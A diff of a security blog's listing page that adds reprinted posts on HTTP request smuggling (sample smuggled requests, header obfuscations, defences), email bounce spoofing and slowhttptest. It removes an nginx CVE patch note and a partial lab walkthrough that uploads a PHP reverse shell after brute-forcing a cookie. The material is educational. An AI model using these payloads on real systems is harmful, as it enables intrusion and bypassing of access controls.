@@ -86,6 +86,226 @@
 
     
         <h2 class="title">
+            <a href="/2023/06/27/HTTP-request-smuggling-vulnerability/">
+                HTTP请求走私漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Jun 27, 2023
+    </time>
+    <section class="content">
+        <h1><span id="http请求走私漏洞">HTTP请求走私漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/115311234">Atkxor</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
+<ul>
+<li>利用Content-Length字段来判定请求体的内容长度</li>
+<li>利用Transfer-Encoding字段来判定请求体的结束位置</li>
+</ul>
+</blockquote>
+<h2><span id="基础知识">基础知识</span></h2><h3><span id="content-length">Content-Length</span></h3><blockquote>
+<p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p>
+</blockquote>
+<h3><span id="transfer-encoding">Transfer-Encoding</span></h3><blockquote>
+<p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。<br>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p>
+</blockquote>
+<h3><span id="cl与te解析优先级顺序">CL与TE解析优先级顺序</span></h3><blockquote>
+<p>CL表示Content-Length，TE表示Transfer-Encoding。优先级顺序详见 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If a message is received with both a Transfer-Encoding and a</span><br><span class="line">Content-Length header field, the Transfer-Encoding overrides the</span><br><span class="line">Content-Length. Such a message might indicate an attempt to perform</span><br><span class="line">request smuggling (Section 9.5) or response splitting (Section 9.4)</span><br><span class="line">and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>TE 优先于 CL ，但可以通过一些方式绕过</p>
+</blockquote>
+<h2><span id="请求走私分类">请求走私分类</span></h2><blockquote>
+<p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
+<ul>
+<li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li>
+<li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
+<li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li>
+<li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li>
+<li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
+</ul>
+</blockquote>
+<h3><span id="cl不为0">CL不为0</span></h3><blockquote>
+<p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。<br>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。<br>比如构造请求：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：\r\n表示 CRLF即换行</p>
+</blockquote>
+<blockquote>
+<p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：<br>第一个请求：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第二个请求：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
+
+<h3><span id="cl-cl漏洞">CL-CL漏洞</span></h3><blockquote>
+<p>RFC7230规范：在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。<br>构造请求：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6\r\n</span><br><span class="line">\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>得到响应，返回400 Bad Request<br><img src="/2023/06/27/HTTP-request-smuggling-vulnerability/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>触发过程：但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
+</blockquote>
+<h3><span id="cl-te漏洞">CL-TE漏洞</span></h3><blockquote>
+<p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p>
+</blockquote>
+<h3><span id="te-te漏洞">TE-TE漏洞</span></h3><blockquote>
+<p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。<br>详见 RFC7230 section 3.3.3.3</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If a Transfer-Encoding header field is present in a response and</span><br><span class="line">the chunked transfer coding is not the final encoding, the</span><br><span class="line">message body length is determined by reading the connection until</span><br><span class="line">it is closed by the server.  If a Transfer-Encoding header field</span><br><span class="line">is present in a request and the chunked transfer coding is not</span><br><span class="line">the final encoding, the message body length cannot be determined</span><br><span class="line">reliably; the server MUST respond with the 400 (Bad Request)</span><br><span class="line">status code and then close the connection.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里列出七种混淆方式:</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.CL实验环境</a></p>
+</blockquote>
+<h3><span id="te-cl漏洞">TE-CL漏洞</span></h3><blockquote>
+<p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a></p>
+</blockquote>
+<h2><span id="绕过前端服务器安全控制">绕过前端服务器安全控制</span></h2><h3><span id="利用cl-te漏洞绕过">利用CL-TE漏洞绕过</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">CL.TE实验环境</a></p>
+</blockquote>
+<h3><span id="利用te-cl漏洞绕过">利用TE-CL漏洞绕过</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">TE.CL实验环境</a></p>
+</blockquote>
+<h2><span id="漏洞防御">漏洞防御</span></h2><blockquote>
+<p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
+<ul>
+<li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
+<li>使用HTTP &#x2F; 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li>
+<li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。<br>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</li>
+</ul>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<p>(<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a>)</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/06/27/Email-bounce-spoof-attack/">
+                电子邮件退信攻击
+            </a>
+        </h2>
+    
+    <time>
+        Jun 27, 2023
+    </time>
+    <section class="content">
+        <h1><span id="电子邮件退信攻击">电子邮件退信攻击</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="http://security.zhiding.cn/security_zone/2010/1225/1974371.shtml">zdnet</a> 并作补充</p>
+</blockquote>
+<h2><span id="杂记">杂记</span></h2><blockquote>
+<p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
+<p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
+<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#111;&#98;&#111;&#x40;&#x61;&#98;&#x63;&#46;&#x63;&#111;&#109;">&#98;&#111;&#98;&#111;&#x40;&#x61;&#98;&#x63;&#46;&#x63;&#111;&#109;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#x62;&#x6f;&#98;&#111;&#64;&#x61;&#x62;&#99;&#x2e;&#x63;&#111;&#109;">&#x62;&#x6f;&#98;&#111;&#64;&#x61;&#x62;&#99;&#x2e;&#x63;&#111;&#109;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
+<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#x4d;&#x41;&#73;&#x4c;&#x45;&#x52;&#x2d;&#x44;&#65;&#x45;&#x4d;&#79;&#x4e;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#x6f;&#109;">&#x4d;&#x41;&#73;&#x4c;&#x45;&#x52;&#x2d;&#x44;&#65;&#x45;&#x4d;&#79;&#x4e;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
+<p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
+<p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
+<p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
+</blockquote>
+<h2><span id="重点">重点</span></h2><blockquote>
+<p>此文其实是为了记念一下一个工具：<a target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> </p>
+<p>几乎绝大部分的邮件攻击都可以由它进行实践，之前测试其实很多现在大厂的消费级邮箱是有或多或少的问题的。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/25/Slowhttptest-Usage/">
+                Slowhttptest Usage
+            </a>
+        </h2>
+    
+    <time>
+        Aug 25, 2022
+    </time>
+    <section class="content">
+        <h1><span id="slowhttptest-对-slow-http-dos-的误判">Slowhttptest 对 Slow HTTP Dos 的误判</span></h1><h2><span id="当场滑跪">当场滑跪</span></h2><blockquote>
+<p>前段时间在巡检公司项目的时候发现了<a target="_blank" rel="noopener" href="https://szczecin.github.io/2022/08/08/Slow-HTTP-Dos/">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</a><br>于是就下发让项目运维去修复了，但是反馈说明明配置了正确的参数，于是我当（zhi）场（jie）滑（dao）跪（qian） ORZ</p>
+<p><img src="/2022/08/25/Slowhttptest-Usage/1.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="发生了什么">发生了什么</span></h2><blockquote>
+<p>所以是发生了什么？漏扫就那么垃圾和我过不去这么多误报？我还好好用 slowhttptest 去验证了，确实存在<code>service available:   NO</code>的显示，图就不发了，拿阿B的给你们看看：<br><img src="/2022/08/25/Slowhttptest-Usage/1.png" alt="image"></p>
+<p>后来看得多了我发现（其实早就发现了），slowhttptest 的<code>slowbody</code>模式下很容易出现<code>service available:   NO</code>，<code>read</code>和<code>header</code>就很容易通过测试<br>但是归根到底是否触发拒绝服务，肯定看：</p>
+<ul>
+<li><ol>
+<li>网站载入延时</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>网站是否还可访问</li>
+</ol>
+</li>
+</ul>
+<p>在看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/114143913">星球守护者</a> 的漏洞复现后我发现，用 slowhttptest 验证 Slow HTTP Dos 真实存在，需要注意：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. slow HTTP test status on Xth second:		X 数字较小，即较早就开始拒绝服务</span><br><span class="line">2. service available:   NO</span><br><span class="line">3. Test ended on X+1th second</span><br><span class="line">4. Exit status: Connection refused		这两点比较重要，真的拒绝服务了直接下一秒就停止测试了</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/25/Slowhttptest-Usage/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="不得不说">不得不说</span></h2><blockquote>
+<p>其实 Dos 类的漏洞你很不好说，因为访问量过大必然服务器承受不住，这个只能做缓解（流量分析、请求时限、扩容等等）<br>所以漏扫出来是否存在这个漏洞或者 slowhttptest 的<code>service available:   NO</code>，有可能是看片面了（某些请求在开始或者后来被识别后被拒绝、中断，或者网页响应时间是否有某个范围内的增量变化等，尤其是这个增量变化，我曾经发现因为一个资产页面正常请求的数量会变化，时延直接从几百ms级变成几s级的）</p>
+<p>好吧，okk</p>
+<p><img src="/2022/08/25/Slowhttptest-Usage/2.jpg" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/24/Shuriken-Node/">
                 Shuriken Node
             </a>
@@ -663,235 +883,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
-                CVE-2014-0133-Nginx
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
-</blockquote>
-<h2><span id="注意">注意</span></h2><blockquote>
-<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
-<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
-</blockquote>
-<h2><span id="成因">成因</span></h2><blockquote>
-<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
-</blockquote>
-<h2><span id="修复">修复</span></h2><blockquote>
-<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/Momentum-2/">
-                Momentum 2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="momentum2">Momentum:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称momentum2">名称：Momentum:2</span></h4><h4><span id="发布日期2021628">发布日期：2021.6.28</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;athena&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名momentum2ova">文件名：Momentum2.ova</span></h4><h4><span id="文件大小698mb">文件大小：698MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentum2ova">下载地址：</span></h4><h4><span id="md5-5e837fd87d809c499911b1cb1a257cd9">MD5: 5E837FD87D809C499911B1CB1A257CD9</span></h4><h4><span id="sha1-17facc18fe6a6979159c4d0a09cc330602e81e68">SHA1: 17FACC18FE6A6979159C4D0A09CC330602E81E68</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Momentum2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/Momentum-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.107 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现五个可见目录，可以去看看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.107/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件上传漏洞发现">文件上传漏洞发现</span></h3><blockquote>
-<p>1.访问一下dashboard.html页面，是一个上传页，会将文件传到目录&#x2F;owls下，而这个目录无法直接上传php文件，只能上传txt文件：</p>
-<p><img src="/2022/08/15/Momentum-2/7.png" alt="image-"></p>
-<p>2.在前端js是没有做出文件上出限制的，目录扫描到ajax.php是0kb，可以去查看ajax.php.bak文件，发现规定在cookie中做出了上传限制，则想到BP抓包修改cookie：</p>
-<p><img src="/2022/08/15/Momentum-2/8.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/9.png" alt="image-"></p>
-<p>ajax.php.bak代码的内容是：当cookie存在，且键名为admin时，是可以上传pdf、php、txt文件的；不过admin需要一个值，代码中已经给出了值，但是在这个值的最后还缺少一位大写的字符；此外，还要使用post方式提交一个参数secure；最后上传成功时会返回一个1</p>
-<p>3.使用crunch生成一个最后一位是大写的字符字典，用于等下BP去爆破cookie；并且修改kali自带的webshell，准备上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -t , -o pass.txt</span><br><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/10.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="burpsuite抓包修改">Burpsuite抓包修改</span></h3><blockquote>
-<p>1.在dashboard.html选择上传php-reverse-shell.php，用BP拦截后，导入Intruder模块，加载刚才生成的字典pass.txt，并添加一个POST数据：</p>
-<p><img src="/2022/08/15/Momentum-2/12.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/13.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/14.png" alt="image-"><br>2.开始爆破cookie，发现最后的大写字符是R，来到Repeater模块，添加cookie和post后发送包，在kali开启端口监听，在&#x2F;owls目录触发webshell：</p>
-<p><img src="/2022/08/15/Momentum-2/15.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/16.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/17.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/18.png" alt="image-"></p>
-<p>3.用python构建一个交互式shell，然后在&#x2F;home&#x2F;athena目录下可以发现第一个flag，即user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-2/19.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
